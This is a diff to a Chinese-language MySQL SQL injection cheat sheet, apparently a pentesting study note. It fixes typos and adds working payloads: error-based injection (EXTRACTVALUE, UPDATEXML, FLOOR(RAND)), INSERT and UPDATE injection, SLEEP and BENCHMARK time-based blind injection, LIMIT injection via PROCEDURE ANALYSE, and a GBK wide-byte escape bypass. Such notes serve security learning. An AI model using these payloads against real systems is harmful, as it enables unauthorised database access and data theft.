@@ -35,8 +35,8 @@ MYSQL默认端口是3306端口
  - `LIKE '%a%'` # 默认不区分大小写
  - `IN (1, 2, 'a')`
  - `REGEXP '^a'` # 默认不区分大小写
- - `WHERE BINARY USERname REGEXP '^a'` # 区分大小写
- - `WHERE BINARY USERname LIKE '%a%'` # 区分大小写
+ - `WHERE BINARY username REGEXP '^a'` # 区分大小写
+ - `WHERE BINARY username LIKE '%a%'` # 区分大小写
 
 ### 当前MYSQL版本信息
  - `VERSION()`
@@ -70,7 +70,7 @@ MYSQL默认端口是3306端口
  - `LENGTH(str)` # 统计字符长度
 
 
-### 字符截取
+### 字符截取1
  - `MID(str, pos, len)`     `MID(str FROM 1 FOR 1)`
  - `SUBSTR(str, pos, len)`   `SUBSTR(str FROM pos FOR len)`
  - `SUBSTRING(str, pos, len)`    ``SUBSTRING(str FROM pos FOR len)``
@@ -138,8 +138,32 @@ MYSQL默认端口是3306端口
  - `SELECT /*! 1,2,3 */` # version 高于 3.23.02
 
 ### 基本操作
- - `INSERT INTO USERs(USERname,password) VALUES('1', '2')`
+ - `INSERT INTO USERs(username,password) VALUES('1', '2')`
  - `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值`
+
+### SELECT语法
+```sql
+SELECT 
+    [ALL | DISTINCT | DISTINCTROW ] 
+      [HIGH_PRIORITY] 
+      [STRAIGHT_JOIN] 
+      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
+      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
+    select_expr [, select_expr ...] 
+    [FROM table_references 
+    [WHERE where_condition] 
+    [GROUP BY {col_name | expr | position} 
+      [ASC | DESC], ... [WITH ROLLUP]] 
+    [HAVING where_condition] 
+    [ORDER BY {col_name | expr | position} 
+      [ASC | DESC], ...] 
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
+    [PROCEDURE procedure_name(argument_list)] 
+    [INTO OUTFILE 'file_name' export_options 
+      | INTO DUMPFILE 'file_name' 
+      | INTO var_name [, var_name]] 
+    [FOR UPDATE | LOCK IN SHARE MODE]]
+```
 
 ## MYSQL中单双反引号
  - **单引号**
@@ -191,7 +215,7 @@ SELECT CONCAT(1, 'byxs') # 1byxs
 
 #### 例2
 ![convert](convert.png)
-USERname为字符类型，字符和数字进行比较，默认都转换为`double`在进行比较
+username为字符类型，字符和数字进行比较，默认都转换为`double`在进行比较
 但是又因为字符串不是数字型，所以被转换为0
 
 ```sql
@@ -280,9 +304,9 @@ id=0 UNION SELECT 1,2,3,GROUP_CONCAT(列名) FROM 表名 # 获得数据
 
 <br>
 ## MYSQL报错注入
-利用`页面能返回报错信息`,将想要得到的数据显示在报错信息中。
+当WEB应用能返回SQL的报错信息时，我们可以把想要的数据通过报错信息带出。
 
-10种MYSQL报错注入的方式(注意：报错注入利用的方式跟**MYSQL版本**有很大关联)
+10种MYSQL报错注入的方式(注意：报错注入利用的方式跟 **MYSQL版本**有很大关联)
  - `SELECT * FROM users WHERE id=1 AND (SELECT 1 FROM (SELECT count(*),concat(USER(),FLOOR(RAND(0)*2))x FROM information_schema.tables group by x)a)`
  - `SELECT * FROM users WHERE id=1 AND (EXTRACTVALUE(1,concat(0x7e,(SELECT USER()),0x7e)))`
    - VERSION() > MYSQL 5.1.5
@@ -327,17 +351,60 @@ id=0 UNION SELECT 1,2,3,GROUP_CONCAT(列名) FROM 表名 # 获得数据
 
 <br>
 ## INSERT INTO注入
- - 报错注入
- - 时间盲注
- - 插入用户所规定的数据
+ - 报错注入(利用MYSQL报错信息带出数据)
+   - `INSERT INTO users VALUES('1','2' AND UPDATEXML(1,CONCAT(1,DATABASE(),0x7e),1) AND '1')`
+   - 连接符可以使用`and or xor && || + - * / | &`
+ - 插入多条数据内容
+   - `INSERT INTO users VALUES(NULL,'1','2'),(NULL,database(),'3')`
+ - 盲注
+   - 布尔盲注
+     - 这边个人认为布尔盲注是没有问题的，但是如果存在多用户操作，那么盲注的过程会出现问题，不如使用时间盲注
+   - 时间盲注
+     - `INSERT INTO users VALUES(NULL,'username' or SLEEP(2),'password');`
+
 
 
 <br>
 ## UPDATE 注入
+ - 报错注入
+   - `UPDATE users SET username = '' AND UPDATEXML(1,CONCAT(1,DATABASE(),0x7e),1) WHERE password = '2'`
+   - 注意：update中子查询不能跟相同的表名
+     - `UPDATE users SET username = '' AND UPDATEXML(1,CONCAT(1,(SELECT id FROM (SELECT * FROM users)x),0x7e),1) WHERE password = '2'`
+ - 盲注(同INSERT)
 
+## DELETE INTO 注入
+ - 报错注入
+ - 盲注(同INSERT)
+
+
+另外的一种姿势   [一种新的MySQL下Update、Insert注入方法](https://www.anquanke.com/post/id/85487)
 
 <br>
 ## LIMIT 注入
+
+### 无ORDER BY
+可以使用`UNION SELECT`来进行联合注入
+```SQL
+SELECT * FROM users LIMIT 1,1 UNION SELECT 1,2,3#,1
+SELECT * FROM users ORDER BY 3LIMIT 1,1 UNION SELECT 1,2,3 #,1     
+# 如果有orderby会报错incorrect usage of UNION and ORDER BY
+```
+
+### 有ORDER BY
+```sql
+// 利用报错
+SELECT * FROM users ORDER BY 3  LIMIT 1,1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1) #,1
+
+// 利用时间盲注
+SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
+
+时间盲注在实验的时候出现报错，报错信息是语法错误，该问题待解决
+```
+
+
+
+
+
 
 <br>
 ## ORDER BY 注入
@@ -369,7 +436,7 @@ CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN username ELSE pass
 在未知字段名的情况下
 
 ##### 利用MYSQL报错
-此报错与报错注入的报错不一样，只是在FLASE的时候让语句执行产生错误
+此报错与报错注入的报错不一样，只是在FALSE的时候让语句执行产生错误
 ```
 如果条件不满足，触发FALSE，SQL语句会产生错误
 数据库报错信息为： Subquery returns more than 1 row
@@ -429,7 +496,7 @@ ORDER BY 注入参照文章:
 
 我们便可以通过这样的比对来获取真正的数据
 同时我们也能观察它们是根据`ASCII`码来进行排序的
-但是这边会出现一个问题，`SELECT 'Bc' UNION SELECT 'b' ORDER BY 1`，`b`和`B`的ASCII码分别为`42`和`62`，但是实际的排序结果如下
+但是这边会出现一个问题，`SELECT 'Bc' UNION SELECT 'b' ORDER BY 1`，`b`和`B`的ASCII码分别为`98`和`66`，但是实际的排序结果如下
 ```
 +----+
 | Bc |
@@ -556,9 +623,9 @@ select  'ab'  union select binary 'Ab' order by 1 ;
 
 
 ### 条件
-针对于使用以下编码格式和过滤方式的站点
- - `GB2312` + `addslashes` or `mysql_real_escape_string`
- - `GBK` + `addslashes`
+针对于使用以下数据库编码格式和过滤方式的站点
+ - `GBK` + `addslashes` or `mysql_real_escape_string`
+ - 注意：如果没有指定php连接mysql的字符集，mysql_real_escape_string 是抵御无效的。
 
 ### 利用方式
 在单引号前面加`%df`,例如`1%df' AND 1=1 %23`
